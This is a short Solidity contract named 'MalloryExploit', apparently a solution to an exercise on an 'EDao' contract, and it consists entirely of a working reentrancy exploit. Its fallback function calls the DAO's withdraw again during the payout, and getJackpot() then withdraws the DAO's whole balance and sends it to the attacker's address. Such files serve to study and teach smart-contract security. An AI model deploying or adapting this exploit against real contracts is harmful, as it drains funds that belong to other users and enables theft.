
pragma solidity ^0.5.4;

import "./solutions/daodown/Edao.sol";

contract MalloryExploit {
	address payable owner;
	EDao public dao;
	bool performAttack = true;

	constructor(address payable _dao_addr) public payable {
		owner = msg.sender;
		dao = EDao(_dao_addr);
	}

	function attack() public payable {
 		dao.fundit.value(1)(address(this));
 		dao.withdraw(address(this), 1);
	}

	function() external payable {
		if (performAttack) {
			performAttack = false;
			dao.withdraw(address(this), 1);
		}
	}

	function getJackpot() public {
		dao.withdraw(address(this), address(dao).balance);
		owner.transfer(address(this).balance);
	}

}


